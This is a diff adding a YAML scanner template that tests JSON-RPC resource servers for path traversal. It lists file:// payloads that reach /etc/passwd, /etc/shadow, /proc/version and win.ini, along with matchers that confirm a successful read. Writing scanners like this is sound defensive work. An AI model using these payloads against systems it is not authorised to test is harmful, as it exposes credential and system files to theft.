@@ -1,0 +1,43 @@
+version: "1"
+name: "resource-path-traversal"
+severity: critical
+description: >
+  Inject path traversal sequences into resource URI templates.
+  Detects servers that pass user-controlled paths directly to filesystem
+  read operations without sanitisation.
+
+requires:
+  capabilities:
+    - resources
+  resource_templates:
+    - "file://"   # server must expose at least one file:// template
+
+steps:
+  - id: probe_traversal
+    type: mutate
+    method: resources/read
+    params:
+      uri: "${payload}"
+    payloads:
+      # Linux — /etc/passwd
+      - "file://../../../etc/passwd"
+      - "file://../../../../etc/passwd"
+      - "file://../../../../../etc/passwd"
+      - "file://../../../../../../etc/passwd"
+      - "file:///etc/passwd"
+      # Linux — /etc/shadow
+      - "file://../../../etc/shadow"
+      - "file:///etc/shadow"
+      # Linux — /proc/version
+      - "file://../../../proc/version"
+      - "file:///proc/version"
+      # Linux — /etc/hosts
+      - "file://../../../etc/hosts"
+      - "file:///etc/hosts"
+      # Windows
+      - "file://..\\..\\..\\.\\windows\\win.ini"
+      - "file://C:\\windows\\win.ini"
+    matchers:
+      - type: jsonrpc_success
+      - type: regex
+        pattern: "root:x:0:0|Linux version|localhost|127\\.0\\.0\\.1|\\[fonts\\]"
